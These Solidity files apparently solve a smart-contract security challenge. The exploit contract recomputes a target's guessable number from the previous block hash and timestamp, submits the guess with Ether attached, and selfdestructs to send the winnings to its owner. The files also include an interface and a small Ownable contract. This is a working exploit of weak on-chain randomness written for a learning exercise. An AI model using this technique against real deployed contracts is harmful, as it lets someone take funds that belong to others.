//SPDX-License-Identifier: Unlicense
pragma solidity ^0.4.21;

// import "@openzeppelin/contracts/access/Ownable.sol";
import "./GuessTheNumberExploit.sol";
import "./Ownable_4_21.sol";

contract GuessTheNewNumberExploit is Ownable {
    function runExploit(address target) onlyOwner public payable {
        uint8 answer = uint8(keccak256(block.blockhash(block.number - 1), now));
        IGuessTheNumber(target).guess.value(msg.value)(answer);
    }

    function cleanup() onlyOwner public {
        selfdestruct(owner());
    }

    function() external payable {}
}

//SPDX-License-Identifier: Unlicense
pragma solidity ^0.4.21;

interface IGuessTheNumber {
    function isComplete() external view returns(bool);
    function guess(uint8 n) external payable;
}

//SPDX-License-Identifier: Unlicense
pragma solidity ^0.4.21;

contract Ownable {
    address private _owner;
    function Ownable() internal{
        _owner = msg.sender;
    }

    modifier onlyOwner() {
        require( msg.sender == _owner);
        _;
    }

    function owner() public view returns(address) {
        return _owner;
    }

}